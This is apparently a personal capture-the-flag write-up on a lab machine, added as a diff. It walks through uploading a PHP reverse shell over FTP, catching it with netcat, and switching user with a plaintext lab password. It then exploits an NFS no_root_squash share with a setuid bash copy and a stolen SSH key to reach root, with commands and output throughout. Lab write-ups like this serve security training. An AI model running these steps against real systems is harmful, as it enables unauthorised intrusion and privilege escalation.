@@ -98,3 +98,210 @@ sh: no job control in this shell
 works!
 
 so now we need to escalate priviledges ...
+
+===
+
+I'm back baby!
+
+## Priv Esc
+
+Let's first login again and put the php file.
+
+```
+❯ ftp 10.10.181.222
+Connected to 10.10.181.222.
+220 (vsFTPd 3.0.3)
+Name (10.10.181.222:tanishq): paradox
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 48       48             24 Nov 08 21:25 backups
+-rw-r--r--    1 0        0           65591 Nov 17 20:42 hallway.jpg
+-rw-r--r--    1 0        0            1770 Nov 17 20:42 index.html
+-rw-r--r--    1 0        0             576 Nov 17 20:42 main.css
+-rw-r--r--    1 0        0            2511 Nov 17 20:42 overpass.svg
+226 Directory send OK.
+ftp> pwd
+257 "/" is the current directory
+ftp> put phpreverseshell.php
+local: phpreverseshell.php remote: phpreverseshell.php
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+5494 bytes sent in 0.00 secs (27.2890 MB/s)
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 48       48             24 Nov 08 21:25 backups
+-rw-r--r--    1 0        0           65591 Nov 17 20:42 hallway.jpg
+-rw-r--r--    1 0        0            1770 Nov 17 20:42 index.html
+-rw-r--r--    1 0        0             576 Nov 17 20:42 main.css
+-rw-r--r--    1 0        0            2511 Nov 17 20:42 overpass.svg
+-rw-r--r--    1 1001     1001         5494 Mar 07 03:10 phpreverseshell.php
+226 Directory send OK.
+```
+
+
+```
+❯ nc -lnvp 1337
+listening on [any] 1337 ...
+connect to [10.8.150.214] from (UNKNOWN) [10.10.181.222] 38004
+Linux localhost.localdomain 4.18.0-193.el8.x86_64 #1 SMP Fri May 8 10:59:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 03:12:19 up 17 min,  0 users,  load average: 0.00, 0.41, 0.89
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=48(apache) gid=48(apache) groups=48(apache)
+sh: cannot set terminal process group (874): Inappropriate ioctl for device
+sh: no job control in this shell
+sh-4.4$ whoami
+whoami
+apache
+sh-4.4$ pwd
+/
+pwd
+sh-4.4$ 
+```
+
+Go to the path `/phpreverseshell.php` and we are in!
+
+let's first get the web flag:
+```
+sh-4.4$ cd ~
+cd ~
+sh-4.4$ ls
+ls
+error
+icons
+noindex
+web.flag
+sh-4.4$ cat web.flag
+cat web.flag
+thm{NOICE}
+sh-4.4$ 
+```
+
+Converting to a python shell using `python3 -c "import pty; pty.spawn('/bin/bash')"`, lets focus on privesc.
+
+```
+bash-4.4$ su paradox
+su paradox
+Password: ShibesAreGreat123
+
+[paradox@localhost html]$ whoami
+whoami
+paradox
+```
+
+nice. Okay. Since we can transfer files using ftp, we can put in `linpeas.sh`
+
+
+```
+[+] Searching ssl/ssh files
+/home/paradox/.ssh/authorized_keys                              
+/home/paradox/.ssh/id_rsa.pub  /usr/bin/passwd
+Possible private SSH keys were found!
+/home/paradox/priv.key
+```
+
+```
+[+] NFS exports?
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe                          
+/home/james *(rw,fsid=0,sync,no_root_squash,insecure)           
+```
+
+```
+Files with capabilities:
+/usr/bin/newgidmap = cap_setgid+ep
+/usr/bin/newuidmap = cap_setuid+ep
+/usr/bin/ping = cap_net_admin,cap_net_raw+p
+/usr/sbin/arping = cap_net_raw+p
+/usr/sbin/clockdiff = cap_net_raw+p
+/usr/sbin/suexec = cap_setgid,cap_setuid+ep
+```
+
+Okay. the NFS thing was full red in color. [Why no_root_squash is not a good idea](http://blog.serverbuddies.com/why-we-should-not-use-the-no_root_squash-option/). We have lots of scope there. To find out what port its running on, we can look at the nmap scan results. However, we can't see it there. It must be filtered or blocked. In any case, we can look for it, by:
+
+```
+[paradox@localhost home]$ rpcinfo -p
+   program vers proto   port  service
+    100000    4   tcp    111  portmapper
+    100000    3   tcp    111  portmapper
+    100000    2   tcp    111  portmapper
+    100000    4   udp    111  portmapper
+    100000    3   udp    111  portmapper
+    100000    2   udp    111  portmapper
+    100024    1   udp  49444  status
+    100024    1   tcp  45735  status
+    100005    1   udp  20048  mountd
+    100005    1   tcp  20048  mountd
+    100005    2   udp  20048  mountd
+    100005    2   tcp  20048  mountd
+    100005    3   udp  20048  mountd
+    100005    3   tcp  20048  mountd
+    100003    3   tcp   2049  nfs
+    100003    4   tcp   2049  nfs
+    100227    3   tcp   2049  nfs_acl
+    100021    1   udp  56460  nlockmgr
+    100021    3   udp  56460  nlockmgr
+    100021    4   udp  56460  nlockmgr
+    100021    1   tcp  32803  nlockmgr
+    100021    3   tcp  32803  nlockmgr
+    100021    4   tcp  32803  nlockmgr
+```
+
+Okay. Its at the port 2049, which is the default for NFS.
+
+```
+❯ ssh paradox@10.10.181.222 -L 2049:localhost:2049
+Enter passphrase for key '/home/tanishq/.ssh/id_rsa': 
+Last login: Sun Mar  7 04:22:48 2021 from 10.8.150.214
+[paradox@localhost ~]$ 
+```
+
+```
+❯ sudo mount -v -t nfs localhost:/ /home/tanishq/mnt
+mount.nfs: timeout set for Sun Mar  7 00:12:57 2021
+mount.nfs: trying text-based options 'vers=4.2,addr=::1,clientaddr=::1'
+```
+
+```
+total 1228
+drwx------  3 tanishq tanishq     124 Mar  7 00:36 .
+drwxr-xr-x 33 tanishq tanishq    4096 Mar  7 00:36 ..
+-rwxr-xr-x  1 root    root    1234376 Mar  7 00:36 bash
+lrwxrwxrwx  1 root    root          9 Nov  8 16:45 .bash_history -> /dev/null
+-rw-r--r--  1 tanishq tanishq      18 Nov  8  2019 .bash_logout
+-rw-r--r--  1 tanishq tanishq     141 Nov  8  2019 .bash_profile
+-rw-r--r--  1 tanishq tanishq     312 Nov  8  2019 .bashrc
+drwx------  2 tanishq tanishq      61 Nov  7 21:20 .ssh
+-rw-------  1 tanishq tanishq      38 Nov 17 16:15 user.flag
+```
+
+`❯ cat id_rsa >> /relevant/path/here/james.key`
+
+
+```
+❯ chmod 600 james.key
+❯ ssh -i james.key james@10.10.179.112
+Last login: Wed Nov 18 18:26:00 2020 from 192.168.170.145
+[james@localhost ~]$ 
+```
+
+```
+[james@localhost ~]$ ls
+bash  user.flag
+[james@localhost ~]$ ./bash
+./bash: /lib64/libtinfo.so.6: no version information available (required by ./bash)
+bash-5.1$ whoami
+james
+bash-5.1$ ./bash -p
+./bash: /lib64/libtinfo.so.6: no version information available (required by ./bash)
+bash-5.1# whoami
+root
+```
+
+hell yea
